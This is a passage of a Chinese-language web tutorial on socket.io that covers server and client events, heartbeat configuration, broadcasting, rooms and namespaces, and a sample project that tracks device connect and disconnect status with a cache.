</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="_7-socket-io"><a href="#_7-socket-io" class="header-anchor">#</a> 7:socket.io</h3> <h4 id="事件"><a href="#事件" class="header-anchor">#</a> 事件</h4> <h5 id="服务端事件"><a href="#服务端事件" class="header-anchor">#</a> 服务端事件</h5> <p>事件监听是实现通讯的基础，因此充分了解socket.io的事件，学习如何在正确的时候使用它们至关重要。在一些关键的的状态下，socket.io可以注册相应的事件，通过事件监听，我们可以在这些事件中作出反应，常用的事件如下：</p> <ul><li><code>connection</code>——客户端成功连接到服务器。</li> <li><code>message</code>——捕获客户端<code>send</code>信息。。</li> <li><code>disconnect</code>——客户端断开连接。</li> <li><code>error</code>——发生错误。</li></ul> <h5 id="客户端事件"><a href="#客户端事件" class="header-anchor">#</a> 客户端事件</h5> <p>较服务端而言，客户端提供更多的监听事件，在实时应用中，我们可以为这些事件注册监听并作出反应，例如：<code>connect</code>提示用户连接成功，<code>disconnect</code>时提示用户停止服务等等。</p> <ul><li><code>connection</code>——成功连接到服务器。</li> <li><code>connecting</code>——正在连接。</li> <li><code>disconnect</code>——断开连接。</li> <li><code>connect_failed</code>——连接失败。</li> <li><code>error</code>——连接错误。</li> <li><code>message</code>——监听服务端send的信息。</li> <li><code>reconnect_failed</code>——重新连接失败。</li> <li><code>reconnect</code>——重新连接成功。</li> <li><code>reconnecting</code>——正在重连。</li></ul> <p>那么客户端<code>socket</code>发起连接时的顺序是怎么样的呢？当第一次连接时，事件触发顺序为： <code>connecting</code> → <code>connect</code>；</p> <p>当失去连接时，事件触发顺序为：<code>disconnect → reconnecting → connecting → reconnect → connect</code>。</p> <h4 id="连接设置"><a href="#连接设置" class="header-anchor">#</a> 连接设置</h4> <p><strong>心跳机制</strong>: <strong>默认情况下, socket.io</strong> 客户机将向服务器发送心跳每 25秒( <strong>磅的心跳间隔</strong> ), 如果服务器没有收到客户机 60秒( <strong>心跳超时</strong> ) 将考虑客户端断开连接。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> socketio <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'socket.io'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>server<span class="token punctuation">,</span> <span class="token punctuation">{</span>
  serveClient<span class="token operator">:</span> config<span class="token punctuation">.</span>env <span class="token operator">!==</span> <span class="token string">'production'</span><span class="token punctuation">,</span>
  path<span class="token operator">:</span> <span class="token string">'/socket.io-client'</span><span class="token punctuation">,</span>
  pingTimeout<span class="token operator">:</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token comment">// default 1000 * 10 * 6</span>
  pingInterval<span class="token operator">:</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token comment">// default 1000 * 2.5</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

global<span class="token punctuation">.</span>socketUsers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./config/socketio'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">default</span><span class="token punctuation">(</span>socketio<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h4 id="常用的事件及方法-要点"><a href="#常用的事件及方法-要点" class="header-anchor">#</a> 常用的事件及方法[要点]</h4> <ul><li>发送一对多（广播），包括它自己；<code>io.sockets.emit</code>/<code>io.emit</code></li> <li>发送一对多（广播），不包括它自己；<code>socket.broadcast.emit</code></li> <li>发送一对一；<code>socket.emit</code></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>io<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'reply'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">/* */</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// listen to the event;监听消息</span>
    
  <span class="token comment">// the following two will emit to all the sockets connected to `/`</span>
  io<span class="token punctuation">.</span>sockets<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">,</span> <span class="token string">'everyone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  io<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'hi'</span><span class="token punctuation">,</span> <span class="token string">'everyone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//short form; 上面的缩写；emit an event to all connected sockets; 一对多（广播），包括它自己</span>
  
  socket<span class="token punctuation">.</span>broadcast<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'user connected'</span><span class="token punctuation">)</span><span class="token comment">//Broadcasting messages; 一对多（广播），不包括它自己；</span>
  socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token comment">/* */</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//emit an event to the socket; 一对一</span>
  
  socket<span class="token punctuation">.</span>volatile<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'bieber tweet'</span><span class="token punctuation">,</span> tweet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//发送易失性消息(new)</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ferret'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> word<span class="token punctuation">,</span> fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//发送和获取数据（确认）(new)</span>
    <span class="token function">fn</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">' says '</span> <span class="token operator">+</span> word<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token keyword">var</span> tweets <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">getBieberTweet</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">tweet</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      socket<span class="token punctuation">.</span>volatile<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'bieber tweet'</span><span class="token punctuation">,</span> tweet<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//发送易失性消息(new)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'disconnect'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">clearInterval</span><span class="token punctuation">(</span>tweets<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">////发送和获取数据（确认）的客户端操作；</span>
<span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token function">io</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// TIP: io() with no args does auto-discovery</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connect'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// TIP: you can avoid listening on `connect` and listen on events directly too!</span>
    socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'ferret'</span><span class="token punctuation">,</span> <span class="token string">'tobi'</span><span class="token punctuation">,</span> <span class="token string">'woot'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// args are sent in order to acknowledgement function</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// data will be 'tobi says woot'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//群组房间消息方法：</span>
<span class="token comment">//https://socket.io/docs/rooms-and-namespaces/</span>
<span class="token comment">//Default room //Each Socket in Socket.IO is identified by a random, unguessable, unique identifier Socket#id.</span>
io<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">//服务器;指定某个房间</span>
<span class="token keyword">var</span> chat <span class="token operator">=</span> io
  <span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">'/chat'</span><span class="token punctuation">)</span><span class="token comment">//命名空间，群里面；</span>
  <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'a message'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        that<span class="token operator">:</span> <span class="token string">'only'</span>
      <span class="token punctuation">,</span> <span class="token string">'/chat'</span><span class="token operator">:</span> <span class="token string">'will get'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//设备端</span>
<span class="token keyword">var</span> chat <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token string">'http://localhost/chat'</span><span class="token punctuation">)</span>
chat<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connect'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    chat<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'hi!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//Joining and leaving; join加入房间；leave离开房间；</span>
io<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  socket<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'some room'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
io<span class="token punctuation">.</span><span class="token function">to</span><span class="token punctuation">(</span><span class="token string">'some room'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'some event'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//然后在广播或发射时简单地使用to或in（它们相同）：</span>
<span class="token comment">//断开连接后，socket会自动离开它们所属的所有通道，您无需进行任何特殊拆卸</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br></div></div><h3 id="_8-项目案例实践"><a href="#_8-项目案例实践" class="header-anchor">#</a> 8:项目案例实践</h3> <h4 id="设备上下线处理"><a href="#设备上下线处理" class="header-anchor">#</a> 设备上下线处理</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token string">'use strict'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> _ <span class="token keyword">from</span> <span class="token string">'lodash'</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">onDisconnect</span><span class="token punctuation">(</span><span class="token comment">/*socket*/</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">onConnect</span><span class="token punctuation">(</span><span class="token parameter">socketIo<span class="token punctuation">,</span> socket</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'info'</span><span class="token punctuation">,</span> <span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    socket<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../api/user/user.socket'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>socketIo<span class="token punctuation">,</span> socket<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">socketIo</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  socketIo<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'connection'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    socket<span class="token punctuation">.</span>address <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socket<span class="token punctuation">.</span>request<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>remoteAddress<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socket<span class="token punctuation">.</span>request<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>remotePort<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    socket<span class="token punctuation">.</span>connectedAt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    socket<span class="token punctuation">.</span><span class="token function-variable function">log</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">SocketIO </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socket<span class="token punctuation">.</span>nsp<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> [</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socket<span class="token punctuation">.</span>address<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// Call onDisconnect.</span>
    socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'disconnect'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      _<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>socketUsers<span class="token punctuation">,</span> <span class="token punctuation">{</span>socketId<span class="token operator">:</span> socket<span class="token punctuation">.</span>id<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      socket<span class="token punctuation">.</span>broadcast<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'update-status'</span><span class="token punctuation">,</span> global<span class="token punctuation">.</span>socketUsers<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span>
          socketId<span class="token operator">:</span> item<span class="token punctuation">.</span>socketId<span class="token punctuation">,</span>
          mac<span class="token operator">:</span> item<span class="token punctuation">.</span>mac<span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      socket<span class="token punctuation">.</span>broadcast<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'client.offline'</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>mac<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">onDisconnect</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>
      socket<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'DISCONNECTED'</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>id<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>mac<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Call onConnect.</span>
    <span class="token function">onConnect</span><span class="token punctuation">(</span>socketIo<span class="token punctuation">,</span> socket<span class="token punctuation">)</span><span class="token punctuation">;</span>
    socket<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'CONNECTED'</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

 socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token parameter">user</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// global.socketUser[user] = socket;</span>
      <span class="token comment">// global.socketUser[socket.id] = user;</span>
      Cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">userSocket_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>user<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">list</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Cache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">userSocket_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>user<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      Cache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">socketUser_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socket<span class="token punctuation">.</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'disconnect'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// let _id = global.socketUser[socket.id];</span>
    <span class="token comment">// if(global.socketUser[_id]) {</span>
    <span class="token comment">//   delete global.socketUser[_id];</span>
    <span class="token comment">// }</span>
    Cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">socketUser_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socket<span class="token punctuation">.</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">_id</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      Cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">userSocket_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>_id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">list</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>list<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        _<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>list<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          Cache<span class="token punctuation">.</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">userSocket_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>_id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          Cache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">userSocket_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>_id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      Cache<span class="token punctuation">.</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">socketUser_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socket<span class="token punctuation">.</span>id<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span 